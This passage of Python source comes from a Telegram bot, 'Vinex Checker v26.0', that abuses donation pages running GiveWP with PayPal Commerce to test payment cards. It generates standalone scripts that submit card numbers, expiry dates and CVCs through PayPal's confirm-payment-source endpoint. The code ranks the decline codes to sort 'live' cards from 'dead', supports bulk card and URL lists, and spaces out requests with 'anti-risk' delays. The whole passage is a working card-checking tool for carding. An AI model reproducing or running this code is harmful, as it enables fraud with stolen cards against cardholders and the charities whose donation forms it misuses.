            price_ids.insert(0, CURRENT_PID)

        order_id = None
        last_err = ""

        for pid in price_ids:
            fields = self._build_fields(amt, pid)
            try:
                da = MultipartEncoder({k: (None, str(v)) for k, v in fields.items()})
                he = {'content-type': da.content_type, 'user-agent': rand_ua(),
                      'x-requested-with': 'XMLHttpRequest',
                      'referer': PAGE_URL, 'origin': f'https://{HOST}'}
                r3 = self.r.post(AJAX_URL,
                    params={'action': 'give_paypal_commerce_create_order'},
                    headers=he, data=da, timeout=12)
                j = r3.json()
                if j.get('success') and isinstance(j.get('data'), dict) and j['data'].get('id'):
                    order_id = j['data']['id']
                    break
                else:
                    last_err = str(j.get('data', {}).get('error', 'fail'))
                    if 'Donation amount' in last_err and 'invalid' in last_err.lower():
                        m = re.search(r'minimum.*?([\d.]+)', last_err, re.I)
                        if m:
                            try:
                                new_min = float(m.group(1))
                                if new_min > float(amt):
                                    amt = f"{new_min:.2f}"
                                    self.minimum = amt
                            except Exception: pass
            except Exception as e:
                last_err = f"EXC: {str(e)[:100]}"

        if not order_id:
            return None, last_err

        # confirm
        confirm_body = ""
        try:
            metadata = PAYPAL or CLIENT_ID or ''
            he4 = {
                'authorization': f'Bearer {self.au or ""}',
                'paypal-client-metadata-id': metadata,
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'referer': 'https://assets.braintreegateway.com/',
                'user-agent': rand_ua(),
            }
            da3 = {
                'payment_source': {'card': {'number': n, 'expiry': expiry, 'security_code': cvc,
                    'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}}}},
                'application_context': {'vault': False},
            }
            cr = self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source',
                headers=he4, json=da3, timeout=12)
            confirm_body = cr.text
        except Exception: pass

        # approve
        for pid in price_ids:
            try:
                fields = self._build_fields(amt, pid)
                da = MultipartEncoder({k: (None, str(v)) for k, v in fields.items()})
                he = {'content-type': da.content_type, 'user-agent': rand_ua(),
                      'x-requested-with': 'XMLHttpRequest',
                      'referer': PAGE_URL, 'origin': f'https://{HOST}'}
                r5 = self.r.post(AJAX_URL,
                    params={'action': 'give_paypal_commerce_approve_order', 'order': order_id},
                    headers=he, data=da, timeout=12)
                text = r5.text + confirm_body
                if '"success":true' in text.lower() and 'error' not in text.lower():
                    return f'CHARGE {amt}$', text
                for kw in LIVE_RESPONSES:
                    if kw.upper() in text.upper():
                        return kw, text
                try:
                    err = str(r5.json()['data']['error'])[:200]
                    if err and err != "None":
                        return err, text
                except Exception: pass
            except Exception: pass

        return confirm_body[:150] if confirm_body else "Approve failed", confirm_body

    def Charge(self, ccx):
        ccx = ccx.strip()
        parts = ccx.split("|")
        if len(parts) < 4:
            return "Invalid card format"
        n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3].strip()
        if "20" in yy: yy = yy.split("20")[1]

        try:
            min_val = float(self.minimum)
        except Exception: min_val = 5.00
        if min_val <= 0: min_val = 1.00

        attempts = [f"{min_val:.2f}"]
        escalation = [f"{min_val * 2:.2f}", f"{min_val * 5:.2f}", f"{min_val * 10:.2f}"]

        PRIORITY = [
            ('CHARGE', 200), ('COMPLETED', 205), ('APPROVED', 195),
            ('INSUFFICIENT_FUNDS', 190), ('INVALID_OR_RESTRICTED_CARD', 188),
            ('TRANSACTION_NOT_PERMITTED', 186), ('Payer cannot pay', 185),
            ('PAYER_CANNOT_PAY', 185), ('ORDER_NOT_APPROVED', 185),
            ('INSTRUMENT_DECLINED', 182), ('PAYMENT_DENIED', 180),
            ('SUSPECTED_FRAUD', 178), ('CVV2_FAILURE', 175), ('CVV_FAILURE', 175),
            ('EXPIRED_CARD', 172), ('DO_NOT_HONOR', 170),
            ('RESTRICTED_OR_INACTIVE_ACCOUNT', 168), ('ACCOUNT_CLOSED', 166),
            ('LOST_OR_STOLEN', 164), ('GENERIC_DECLINE', 155),
            ('TRANSACTION_REFUSED', 153), ('DECLINED', 100),
        ]
        def score(r):
            if not r: return 0
            up = r.upper()
            for k, s in PRIORITY:
                if k.upper() in up: return s
            return 1

        all_results = []
        create_errors = []
        q = list(attempts)
        while q:
            amt = q.pop(0)
            res, text = self._attempt(n, mm, yy, cvc, amt)
            if res:
                all_results.append({'amount': amt, 'result': res, 'text': text})
                if 'Donation amount' in str(res) and 'invalid' in str(res).lower():
                    if escalation: q.append(escalation.pop(0))
                    continue
                break
            else:
                create_errors.append((amt, text))
                if text and 'Donation amount' in text and 'invalid' in text.lower():
                    if escalation: q.append(escalation.pop(0))

        if not all_results:
            if create_errors:
                _, last_err = create_errors[-1]
                return last_err if last_err else "No response"
            return "No response"

        best = max(all_results, key=lambda x: score(x['result']))
        self.donation = best['amount']
        res = best['result']
        if 'ORDER_NOT_APPROVED' in res.upper() or 'PAYER_CANNOT_PAY' in res.upper():
            return "Payer cannot pay for this transaction."
        return res


# ═══════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════
def single_check():
    print("\n--- Single Card ---")
    card = input("Card (num|mm|yy|cvc): ").strip()
    if not card: return
    p = PayPal()
    print("Response:", p.Charge(card))


def file_check():
    print("\n--- File Check ---")
    path = input("File: ").strip()
    if not os.path.exists(path):
        print("Not found"); return
    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
        cards = [l.strip() for l in f if l.strip()]
    if not cards: return
    out = f"results_{int(time.time())}.txt"
    shared = PayPal()
    print(f"Config: form={ID_FORM2} currency={CURRENCY} min={MINIMUM} token={'YES' if shared.au else 'NO'}")
    with open(out, 'w', encoding='utf-8') as fo:
        for i, c in enumerate(cards, 1):
            res = shared.Charge(c)
            line = f"{c} => {res}"
            print(f"[{i}/{len(cards)}] {line}")
            fo.write(line + "\n"); fo.flush()
            time.sleep(random.uniform(1.0, 1.5))
    print("Saved:", out)


def main():
    print("═" * 50)
    print(f"  VINEX Gateway v26.0")
    print(f"  {PAGE_URL}")
    print(f"  Generated: {time.strftime('%Y-%m-%d %H:%M', time.localtime(GENERATED_AT))}")
    print(f"  Currency:  {CURRENCY}  Minimum: {MINIMUM}")
    print(f"  Token:     {'YES' if AU else 'NO'}  Nonce: {'YES' if NONCE else 'NO'}")
    print(f"  Terms:     {len(TERMS_FIELDS)} fields")
    print(f"  Fields:    {len(FORM_FIELDS)} extracted")
    print("═" * 50)
    while True:
        try:
            print("\n[1] Single  [2] File  [3] Refresh  [0] Exit")
            c = input("Choose: ").strip()
            if c == '1': single_check()
            elif c == '2': file_check()
            elif c == '3':
                p = PayPal()
                p._refresh_all()
                print(f"Refreshed: token={'YES' if p.au else 'NO'} nonce={'YES' if p.nonce else 'NO'}")
            elif c == '0': break
        except (KeyboardInterrupt, EOFError): break
        except Exception: continue


if __name__ == '__main__':
    try: main()
    except Exception as e:
        print(f"Error: {e}")
        input("Press Enter to exit...")
'''

_GATEWAY_TEMPLATE = Template(GATEWAY_TEMPLATE_STR)


def generate_gateway_code(result, link, tester=None):
    link = link or 'https://invalid.local/'
    def g(a, d=''):
        try:
            if tester and getattr(tester, a, None): return getattr(tester, a)
            return d
        except Exception: return d
    p = urlparse(link); host = p.netloc or 'invalid.local'

    config = {}
    if tester:
        try: config = tester.export_config()
        except Exception: config = {}
    if not config:
        config = {
            'page_url': link, 'host': host, 'ajax_url': f'https://{host}/wp-admin/admin-ajax.php',
            'id_form1': None, 'id_form2': None, 'nonce': None, 'access_token': None,
            'paypal_meta': None, 'client_id': None, 'currency': 'USD', 'minimum': '5.00',
            'current_price_id': None, 'price_levels': [], 'form_fields': {},
            'terms_fields': [], 'hidden_fields': {}, 'form_steps': ['single'],
            'buttons': [], 'gateway_type': 'unknown', 'auth_method': 'none',
            'donation': '5.00', 'saved_at': time.time(),
        }

    init_resp = str(result or 'APPROVED')[:200].replace('\n', ' ').replace('\r', '')
    init_amt = str(config.get('donation', '5.00'))

    return _GATEWAY_TEMPLATE.safe_substitute(
        generated_at=time.strftime('%Y-%m-%d %H:%M:%S'),
        page_url=link,
        initial_response=init_resp,
        initial_amount=init_amt,
        config_json=repr(config),
        live_responses_json=repr(LIVE_RESPONSES),
    )


# ═══════════════════════════════════════════════════════════════
#  BOT HANDLERS
# ═══════════════════════════════════════════════════════════════
@bot.message_handler(commands=['start'])
def cmd_start(message):
    try:
        save_user(message.from_user.id)
        react_to(message, '🔥')
        if is_blocked(message.from_user.id):
            safe_send_message(message.chat.id, f'[⚡] {B("Blocked")}.')
            return
        uid = message.from_user.id
        name = message.from_user.first_name or 'User'
        text = (
            f'[⚡] {SB("Welcome to Vinex v26.0")} {ve("party")}\n'
            f'{vsep()}\n'
            f'{vt("User", f"{name} [VIP]")}\n'
            f'{vt("ID", f"<code>{uid}</code>")}\n'
            f'{vt("Status", B("Online"))} {ve("party")}\n'
            f'{vsep()}\n'
            f'{vt("Single", "<code>/paypal URL</code>")}\n'
            f'{vt("Bulk", "<code>/mass</code>")}\n'
            f'{vt("Resume", "<code>/resume</code>")}\n'
            f'{vt("Stop", "<code>/stop</code>")}\n'
            f'{vt("Stats", "<code>/stats</code>")}\n'
            f'{vt("Diag", "<code>/diag URL</code>")}\n'
            f'{vsep()}\n'
            f'{vt("Engine", "Smart Edition v26")}\n'
            f'{vt("Extraction", "Full (fields+terms+steps)")}\n'
            f'{vt("Gateway", "Lives 1 week")}\n'
            f'{vt("Anti-Risk", "1.0-1.5s between cards")}\n'
            f'[⚡] {SB("Vinex")} - {B("Checker")}'
        )
        kb = types.InlineKeyboardMarkup(row_width=2)
        kb.add(vinex_btn('Stats', 'success', 'record', callback_data='stats'),
               vinex_btn('Help', 'success', 'gear', callback_data='help'))
        kb.add(vinex_btn('Quick Scan', 'primary', 'play', callback_data='howto_paypal'),
               vinex_btn('Bulk Scan', 'primary', 'gift', callback_data='howto_mass'))
        kb.add(vinex_btn('Try Luck', 'primary', 'party', callback_data='luck'),
               vinex_btn('Stop', 'danger', 'stop', callback_data='stop'))
        kb.add(vinex_btn('Emoji Pack', 'primary', 'laugh', callback_data='emojis'))
        safe_send_message(message.chat.id, text, reply_markup=kb, effect=EFFECT_CELEBRATE)
    except Exception: log.exception('cmd_start')


@bot.message_handler(commands=['help'])
def cmd_help(message):
    try:
        react_to(message, '💡')
        text = (
            f'[⚡] {SB("Vinex Manual v26.0")} {ve("gear")}\n'
            f'{vsep()}\n'
            f'{vt("Single", "<code>/paypal URL</code>")}\n'
            f'  {SB("→")} Full extraction (fields+terms+hidden+steps)\n'
            f'  {SB("→")} Smart amount (minimum-first + escalation)\n'
            f'  {SB("→")} Gateway lives 1 week (auto-refresh token/nonce)\n'
            f'{vt("Bulk", "<code>/mass</code> + .txt")}\n'
            f'{vt("Delay", "1.0-1.5s between cards (anti-risk)")}\n'
            f'{vt("Control", "<code>/stop</code> / <code>/resume</code>")}\n'
            f'{vt("Diag", "<code>/diag URL</code>")}\n'
            f'{vsep()}\n'
            f'[⚡] {SB("Vinex")} - {B("Checker")}'
        )
        kb = types.InlineKeyboardMarkup()
        kb.add(vinex_btn('Back', 'primary', 'play', callback_data='back_start'))
        safe_send_message(message.chat.id, text, reply_markup=kb, effect=EFFECT_CELEBRATE)
    except Exception: pass


@bot.message_handler(commands=['ping'])
def cmd_ping(message):
    try:
        t0 = time.time()
        sent = safe_send_message(message.chat.id, '🏓 Pinging...')
        dt = (time.time() - t0) * 1000
        if sent:
            safe_edit_message(message.chat.id, sent.message_id,
                f'[⚡] {SB("PONG")}\n{vsep()}\n'
                f'{vt("Latency", f"<code>{dt:.0f} ms</code>")}\n'
                f'{vt("Bot", "VINEX v26.0")}\n'
                f'{vt("Users", f"<code>{len(open(USERS_FILE).read().splitlines())}</code>")}\n'
                f'{vt("Turnstile", "✅ Enabled" if _turnstile.enabled else "⚠️ Disabled")}')
    except Exception: pass


@bot.message_handler(commands=['stats'])
def cmd_stats(message):
    try:
        react_to(message, '📊')
        s = load_stats()
        users_n = len(open(USERS_FILE).read().splitlines())
        rate = (s.get('live', 0) / s.get('checks', 1) * 100 if s.get('checks', 0) else 0)
        filled = int(rate / 5)
        bar = '█' * filled + '░' * (20 - filled)
        text = (
            f'[⚡] {SB("Global Stats")} {ve("record")}\n'
            f'{vsep()}\n'
            f'{vt("Users", f"<code>{users_n}</code>")}\n'
            f'{vt("Checks", f"<code>{s.get(chr(99)+chr(104)+chr(101)+chr(99)+chr(107)+chr(115),0)}</code>")}\n'
            f'{vt("Live", f"<code>{s.get(chr(108)+chr(105)+chr(118)+chr(101),0)}</code>")} {ve("party")}\n'
            f'{vt("Dead", f"<code>{s.get(chr(100)+chr(101)+chr(97)+chr(100),0)}</code>")} {ve("ban")}\n'
            f'{vt("Rate", f"<code>{rate:.1f}%</code>")}\n'
            f'{vsep()}\n'
            f'<code>{bar}</code> {B(str(round(rate)) + "%")}'
        )
        kb = types.InlineKeyboardMarkup(row_width=2)
        kb.add(vinex_btn('Menu', 'primary', 'play', callback_data='back_start'),
               vinex_btn('Luck', 'success', 'party', callback_data='luck'))
        safe_send_message(message.chat.id, text, reply_markup=kb)
    except Exception: pass


@bot.message_handler(commands=['luck'])
def cmd_luck(message):
    try:
        react_to(message, '🎲')
        d = send_dice(message.chat.id, '🎲')
        if d:
            time.sleep(3)
            val = d.dice.value if hasattr(d, 'dice') else 0
            if val >= 5:
                safe_send_message(message.chat.id, f'🎉 Lucky! <code>{val}</code>\n🔥 Try /paypal!', effect=EFFECT_FIRE)
            else:
                safe_send_message(message.chat.id, f'🎲 Rolled <code>{val}</code>\n😏 Next time!')
    except Exception: pass


@bot.message_handler(commands=['mood'])
def cmd_mood(message):
    try:
        emoji = random.choice(['🎲', '🎯', '⚽', '🏀', '🎳', '🎰'])
        react_to(message, '🎉')
        send_dice(message.chat.id, emoji)
    except Exception: pass


@bot.message_handler(func=lambda m: m.text and m.text.lower().startswith('/paypal'))
def cmd_paypal(message):
    try:
        save_user(message.from_user.id)
        if is_blocked(message.from_user.id):
            safe_send_message(message.chat.id, f'[⚡] {B("Blocked")}.')
            return
        uid = message.from_user.id
        now = time.time()
        if now - user_last_paypal[uid] < PAYPAL_COOLDOWN: return
        user_last_paypal[uid] = now
        chat_id = message.chat.id
        parts = message.text.split(maxsplit=1)
        if len(parts) != 2:
            safe_send_message(chat_id, f'[⚡] {B("Usage")}: <code>/paypal URL</code>')
            return
        link = safe_url(parts[1].strip())
        if not link:
            safe_send_message(chat_id, f'[⚡] {B("Invalid link")}.')
            return
        lkey = f'{uid}:{normalize_url_key(link)}'
        if lkey in link_cooldowns:
            if now - link_cooldowns[lkey] < LINK_COOLDOWN:
                rem = int(LINK_COOLDOWN - (now - link_cooldowns[lkey]))
                safe_send_message(chat_id, f'[⚡] {B("Cooling")}: {rem}s')
                return
        link_cooldowns[lkey] = now

        react_to(message, '⚡')
        show_typing(chat_id, 'typing', duration=3.0)
        ko = safe_send_message(chat_id,
            f'[⚡] {SB("Vinex Scanning")}\n'
            f'{vsep()}\n'
            f'{vt("Target", f"<code>{link[:80]}</code>")}\n'
            f'{vt("Engine", "v26.0 Smart")}\n'
            f'{vsep()}\n'
            f'[⚡] {ve("gear")} {SB("Extracting + Testing")}...')
        if not ko: return

        bump_stat('checks')
        result = check_single_link(link)
        live = result.get('live', False)
        tester = result.get('tester')
        user_name = message.from_user.first_name or 'User'

        if not live:
            bump_stat('dead')
            react_to(message, '😢')
            resp_text = normalize_result(result.get('respons', 'Unknown'))[:300]
            safe_edit_message(chat_id, ko.message_id,
                f'[⚡] {SB("Dead Detected")} {ve("ban")}\n'
                f'{vsep()}\n'
                f'{vt("User", f"{user_name} [VIP]")}\n'
                f'{vt("Status", B("Dead"))} {ve("ban")}\n'
                f'{vt("Response", f"<code>{resp_text}</code>")}\n'
                f'{vt("Auth", f"<code>{tester.auth_method if tester else chr(45)}</code>")}\n'
                f'{vsep()}\n'
                f'[⚡] {SB("Vinex")} - {B("Checker")}')
            return

        bump_stat('live')
        react_to(message, '🔥')
        show_typing(chat_id, 'upload_document', duration=2.0)

        try:
            code = generate_gateway_code(result['respons'], result['link'], tester)
            if not code or len(code) < 1000:
                raise Exception(f'Too small: {len(code)}b')
        except Exception as e:
            safe_edit_message(chat_id, ko.message_id,
                f'[⚡] {SB("Error")}: <code>{str(e)[:200]}</code>')
            return

        fname = f'vinex_v26_{int(time.time())}_{uid}.py'
        try:
            with open(fname, 'w', encoding='utf-8') as f:
                f.write(code)
        except Exception as e:
            safe_edit_message(chat_id, ko.message_id,
                f'[⚡] {SB("File Error")}: <code>{str(e)[:200]}</code>')
            return

        display = normalize_result(result.get('respons', ''))[:200]
        is_charge = 'CHARGE' in str(result.get('respons', '')).upper()
        status = 'Charged' if is_charge else 'Hit'
        head = (f'[⚡] {SB("Charged")} {ve("party")} {ve("cash")}'
                if is_charge else f'[⚡] {SB("Hit Detected")} {ve("party")}')
        cfg = result.get('config') or {}
        currency = cfg.get('currency', 'USD')
        minimum = cfg.get('minimum', '5.00')
        terms_n = len(cfg.get('terms_fields', []))
        fields_n = len(cfg.get('form_fields', {}))
        steps_n = len(cfg.get('form_steps', []))

        caption = (
            f'{head}\n'
            f'{vsep()}\n'
            f'{vt("User", f"{user_name} [VIP]")}\n'
            f'{vt("Status", B(status))} {ve("party")}\n'
            f'{vt("Response", f"<code>{display}</code>")}\n'
            f'{vt("Amount", f"<code>{result.get('amount', '5.00')} {currency}</code>")}\n'
            f'{vt("Minimum", f"<code>{minimum} {currency}</code>")}\n'
            f'{vt("Fields", f"<code>{fields_n}</code>")}\n'
            f'{vt("Terms", f"<code>{terms_n}</code>")}\n'
            f'{vt("Steps", f"<code>{steps_n}</code>")}\n'
            f'{vt("Auth", f"<code>{cfg.get('auth_method', 'none')}</code>")}\n'
            f'{vsep()}\n'
            f'{SB("Gateway lives 1 week + auto-refresh")}\n'
            f'[⚡] {SB("Vinex")} - {B("Checker")}'
        )

        sent = None
        for attempt in range(3):
            try:
                with open(fname, 'rb') as f:
                    kw = {'chat_id': chat_id, 'document': f, 'timeout': 180}
                    if attempt == 0:
                        kw['caption'] = caption
                        kw['parse_mode'] = 'HTML'
                        try: kw['message_effect_id'] = EFFECT_FIRE
                        except Exception: pass
                    elif attempt == 1:
                        kw['caption'] = re.sub(r'<[^>]+>', '', caption)[:1024]
                    sent = bot.send_document(**kw)
                if sent: break
            except Exception: continue

        if sent:
            safe_edit_message(chat_id, ko.message_id, f'[⚡] {SB("Delivered")} {ve("party")}')
            try: send_dice(chat_id, '🎉')
            except Exception: pass
            try: os.remove(fname)
            except Exception: pass
        else:
            safe_send_message(chat_id, f'{caption}\n\n[⚡] {SB("File delivery failed")}')
    except Exception: log.exception('cmd_paypal')


@bot.message_handler(commands=['mass'])
def cmd_mass(message):
    try:
        save_user(message.from_user.id)
        if is_blocked(message.from_user.id):
            safe_send_message(message.chat.id, f'[⚡] {B("Blocked")}.')
            return
        uid = message.from_user.id
        now = time.time()
        if now - user_last_mass[uid] < MASS_COOLDOWN: return
        user_last_mass[uid] = now
        if mass_active.get(uid, False):
            safe_send_message(message.chat.id, '⚠️ Job running. /stop first.')
            return
        msg = safe_send_message(message.chat.id,
            f'[⚡] {SB("Bulk Mode")}\n{vsep()}\n'
            f'{vt("Format", "One URL per line")}\n'
            f'{vt("Max", "10 MB")}\n'
            f'{vt("Dedup", "Smart")}\n'
            f'{vt("Engine", "v26.0 Smart")}\n'
            f'{vt("Delay", "1.0-1.5s (anti-risk)")}\n'
            f'{vt("Gateway", "Lives 1 week")}')
        if msg:
            bot.register_next_step_handler(msg, handle_mass_file)
    except Exception: log.exception('cmd_mass')


@bot.message_handler(commands=['resume'])
def cmd_resume(message):
    try:
        uid = message.from_user.id
        chat_id = message.chat.id
        progress = load_progress(uid)
        if not progress:
            safe_send_message(chat_id, f'[⚡] {B("No saved progress")}.')
            return
        if mass_active.get(uid, False):
            safe_send_message(chat_id, '⚠️ Job running already.')
            return
        total = progress.get('total', 0)
        processed = progress.get('processed', 0)
        if processed >= total:
            safe_send_message(chat_id, f'✅ Complete ({processed}/{total})')
            clear_progress(uid)
            return
        links = progress.get('links', [])
        if not links:
            safe_send_message(chat_id, '❌ Corrupt progress.')
            clear_progress(uid)
            return
        safe_send_message(chat_id, f'♻️ Resuming {processed}/{total}...')
        threading.Thread(target=run_mass_job,
            args=(chat_id, uid, links, processed, progress), daemon=True).start()
    except Exception: log.exception('cmd_resume')


@bot.message_handler(commands=['stop'])
def cmd_stop(message):
    try:
        uid = message.from_user.id
        if mass_active.get(uid, False):
            mass_pause[uid] = True
            safe_send_message(message.chat.id, '🛑 Stopping...')
        else:
            safe_send_message(message.chat.id, '❌ No active job.')
    except Exception: pass


def handle_mass_file(message):
    try:
        if not message.document:
            safe_send_message(message.chat.id, '❌ Send a .txt file.')
            return
        size = message.document.file_size or 0
        if size > MAX_FILE_SIZE:
            safe_send_message(message.chat.id, f'❌ File too large: {size // 1024} KB')
            return
        uid = message.from_user.id
        chat_id = message.chat.id
        try:
            fi = retry_call(bot.get_file, message.document.file_id, retries=4)
        except Exception as e:
            safe_send_message(chat_id, f'⚠️ Network: <code>{str(e)[:150]}</code>')
            return
        try:
            data = retry_call(bot.download_file, fi.file_path, retries=4)
        except Exception as e:
            safe_send_message(chat_id, f'⚠️ Download: <code>{str(e)[:150]}</code>')
            return
        if not data:
            safe_send_message(chat_id, '❌ Empty file.')
            return
        raw = data.decode('utf-8', errors='ignore').splitlines()
        links = []
        seen = set()
        dupes = 0
        for line in raw:
            s = safe_url(line.strip())
            if not s: continue
            k = normalize_url_key(s)
            if k in seen:
                dupes += 1
                continue
            seen.add(k)
            links.append(s)
        if not links:
            safe_send_message(chat_id, '❌ No valid URLs.')
            return
        total = len(links)
        progress = {
            'total': total, 'processed': 0, 'live': 0, 'dead': 0,
            'links': links, 'started_at': time.time(),
        }
        save_progress(uid, progress)
        dupe_msg = f'\n🗑️ Duplicates: <code>{dupes}</code>' if dupes else ''
        safe_send_message(chat_id,
            f'[⚡] {SB("Ready")} {ve("party")}\n{vsep()}\n'
            f'{vt("Loaded", f"<code>{total}</code> unique")}{dupe_msg}\n'
            f'{vt("Mode", "v26.0 Smart")}\n'
            f'{vt("Delay", "1.0-1.5s (anti-risk)")}\n'
            f'{vsep()}\n'
            f'{ve("sound")} {SB("Launching")}...')
        threading.Thread(target=run_mass_job,
            args=(chat_id, uid, links, 0, progress), daemon=True).start()
    except Exception: log.exception('handle_mass_file')


def run_mass_job(chat_id, uid, links, start_idx, progress):
    total = len(links)
    processed = start_idx
    live = progress.get('live', 0)
    dead = progress.get('dead', 0)
    started_at = progress.get('started_at', time.time())
    mass_active[uid] = True
    mass_pause[uid] = False
    results_file = RESULTS_TMPL.format(uid, int(started_at))
    live_dir = LIVE_DIR_TMPL.format(uid, int(started_at))
    try: os.makedirs(live_dir, exist_ok=True)
    except Exception: pass

    state = {
        'processed': processed, 'live': live, 'dead': dead,
        'last_link': '', 'last_resp': '', 'last_live': False,
        'status': 'starting', 'live_idx': 0, 'stop': False,
    }
    shared = mass_shared[uid] = {'state': state, 'lock': threading.Lock()}

    status_msg = safe_send_message(chat_id,
        f'[⚡] {SB("Mass Scan Running")}\n{vsep()}\n'
        f'{vt("Total", f"<code>{total}</code>")}\n'
        f'{vt("Delay", "1.0-1.5s")}\n⏳ Starting...')

    def status_loop():
        last_text = ''
        while True:
            try:
                with shared['lock']:
                    st = dict(state)
                if st['stop']: break
                pn = st['processed']; ln = st['live']; dn = st['dead']
                ll = st['last_link']; lr = st['last_resp']; lv = st['last_live']; ls = st['status']
                pct = int((pn / total) * 100) if total else 0
                elapsed = time.time() - started_at
                spd = pn / elapsed if elapsed else 0
                eta = (total - pn) / spd if spd > 0 else 0
                filled = int((pct / 100) * 20)
                bar = '█' * filled + '░' * (20 - filled)
                if ll:
                    icon = '✅' if lv else '❌'
                    last = f"{icon} <b>Last:</b>\n<code>{ll[:60]}</code>\n💬 {lr[:60]}"
                else:
                    last = '⏳ Waiting...'
                stat_txt = ('🔄 Checking...' if ls == 'checking' else '⏸️ Moving...')
                text = (
                    f'[⚡] {SB("Mass Scan")}\n{vsep()}\n'
                    f'{vt("Total", f"<code>{total}</code>")}\n'
                    f'{vt("Processed", f"<code>{pn}</code>")}\n'
                    f'{vt("Live", f"<code>{ln}</code>")} {ve("party")}\n'
                    f'{vt("Dead", f"<code>{dn}</code>")}\n'
                    f'{vt("Progress", f"{pct}%")}\n'
                    f'<code>{bar}</code>\n'
                    f'{vsep()}\n{last}\n{vsep()}\n{stat_txt}\n'
                    f'{vt("Speed", f"<code>{spd:.2f}/s</code>")}\n'
                    f'{vt("ETA", f"{int(eta // 60)}m{int(eta % 60)}s")}')
                if text != last_text and status_msg:
                    safe_edit_message(chat_id, status_msg.message_id, text)
                    last_text = text
            except Exception: pass
            time.sleep(STATUS_UPDATE_EVERY)

    threading.Thread(target=status_loop, daemon=True).start()

    try:
        for idx in range(start_idx, total):
            if mass_pause.get(uid, False):
                with shared['lock']:
                    state['processed'] = processed
                    state['live'] = live
                    state['dead'] = dead
                    state['stop'] = True
                progress['processed'] = processed
                progress['live'] = live
                progress['dead'] = dead
                save_progress(uid, progress)
                safe_send_message(chat_id, f'🛑 Stopped at {processed}/{total}\n♻️ /resume')
                return
            link = links[idx]
            with shared['lock']:
                state['status'] = 'checking'
            try:
                result = check_single_link(link)
            except Exception:
                result = {'link': str(link)[:100], 'live': False, 'respons': 'FATAL', 'tester': None}
            processed += 1
            resp = normalize_result(result.get('respons', 'Unknown'))[:100]
            is_live = result.get('live', False)
            with shared['lock']:
                state['processed'] = processed
                state['last_link'] = link
                state['last_resp'] = resp
                state['last_live'] = is_live
            try:
                with open(results_file, 'a', encoding='utf-8') as f:
                    f.write(f'{link} => {result.get("respons", "unknown")}\n')
            except Exception: pass
            bump_stat('checks')
            if is_live:
                live += 1
                with shared['lock']:
                    state['live'] = live
                    state['live_idx'] += 1
                    lidx = state['live_idx']
                bump_stat('live')
                try:
                    tester = result.get('tester')
                    code = generate_gateway_code(result['respons'], result['link'], tester)
                    gpath = os.path.join(live_dir, f'gateway_{lidx}_{int(time.time())}.py')
                    with open(gpath, 'w', encoding='utf-8') as f:
                        f.write(code)
                    cfg = result.get('config') or {}
                    cur = cfg.get('currency', 'USD')
                    mn = cfg.get('minimum', '5.00')
                    caption = (
                        f'[⚡] {SB("LIVE")} #{lidx} {ve("party")}\n'
                        f'{vsep()}\n'
                        f'{vt("URL", f"<code>{result["link"][:80]}</code>")}\n'
                        f'{vt("Response", resp[:80])}\n'
                        f'{vt("Amount", f"<code>{result.get(chr(97)+chr(109)+chr(111)+chr(117)+chr(110)+chr(116),chr(53)+chr(46)+chr(48)+chr(48))} {cur}</code>")}\n'
                        f'{vt("Minimum", f"<code>{mn} {cur}</code>")}\n'
                        f'{vsep()}\n'
                        f'[⚡] {SB("Vinex")} - {B("Checker")}')
                    sent = safe_send_document(chat_id, gpath, caption=caption)
                    if sent:
                        try: os.remove(gpath)
                        except Exception: pass
                except Exception: log.exception('live delivery')
            else:
                dead += 1
                with shared['lock']:
                    state['dead'] = dead
                bump_stat('dead')
            if processed % PROGRESS_SAVE_EVERY == 0:
                progress['processed'] = processed
                progress['live'] = live
                progress['dead'] = dead
                save_progress(uid, progress)
            with shared['lock']:
                state['status'] = 'moving'
            # ANTI-RISK DELAY between links
            time.sleep(random.uniform(CARD_DELAY_MIN, CARD_DELAY_MAX))
        progress['processed'] = processed
        progress['live'] = live
        progress['dead'] = dead
        save_progress(uid, progress)
        with shared['lock']:
            state['stop'] = True
        rate = int((live / total) * 100) if total else 0
        final = (
            f'[⚡] {SB("Mass Complete")} {ve("party")}\n{vsep()}\n'
            f'{vt("Total", f"<code>{total}</code>")}\n'
            f'{vt("Live", f"<code>{live}</code>")} {ve("party")}\n'
            f'{vt("Dead", f"<code>{dead}</code>")}\n'
            f'{vt("Rate", f"<code>{rate}%</code>")}\n'
            f'{vt("Results", f"<code>{results_file}</code>")}')
        if status_msg:
            safe_edit_message(chat_id, status_msg.message_id, final)
        else:
            safe_send_message(chat_id, final)
        clear_progress(uid)
    except Exception:
        log.exception('run_mass_job')
        progress['processed'] = processed
        progress['live'] = live
        progress['dead'] = dead
        save_progress(uid, progress)
        with shared['lock']:
            state['processed'] = processed
            state['live'] = live
            state['dead'] = dead
            state['stop'] = True
        safe_send_message(chat_id, f'⚠️ Crashed at {processed}/{total}\n♻️ /resume')
    finally:
        mass_active[uid] = False
        mass_pause[uid] = False


@bot.message_handler(commands=['diag'])
def cmd_diag(message):
    try:
        if str(message.from_user.id) not in ADMINS:
            safe_send_message(message.chat.id, '❌ Admin only.')
            return
        parts = message.text.split(maxsplit=1)
        if len(parts) < 2:
            safe_send_message(message.chat.id, 'Usage: <code>/diag URL</code>')
            return
        link = safe_url(parts[1].strip())
        if not link:
            safe_send_message(message.chat.id, '❌ Invalid link.')
            return
        msg = safe_send_message(message.chat.id, '🔬 Diagnosing (v26 full extraction)...')
        if not msg: return
        tester = VinexTester(link)
        tester.Key()
        cfg = tester.export_config()
        cf_info = '—'
        if tester.cf_detected:
            cf_info = '✅ Solved' if tester.cf_solved else '⚠️ Detected'
        steps_s = ','.join(cfg.get('form_steps', ['single']))[:50]
        report = (
            f'[⚡] {SB("Diagnostics v26.0")}\n{vsep()}\n'
            f'{vt("URL", f"<code>{link[:80]}</code>")}\n'
            f'{vt("GW", f"<code>{cfg.get(chr(103)+chr(97)+chr(116)+chr(101)+chr(119)+chr(97)+chr(121)+chr(95)+chr(116)+chr(121)+chr(112)+chr(101),chr(45))}</code>")}\n'
            f'{vt("Form", f"<code>{cfg.get(chr(105)+chr(100)+chr(95)+chr(102)+chr(111)+chr(114)+chr(109)+chr(50)) or chr(78)+chr(79)+chr(78)+chr(69)}</code>")}\n'
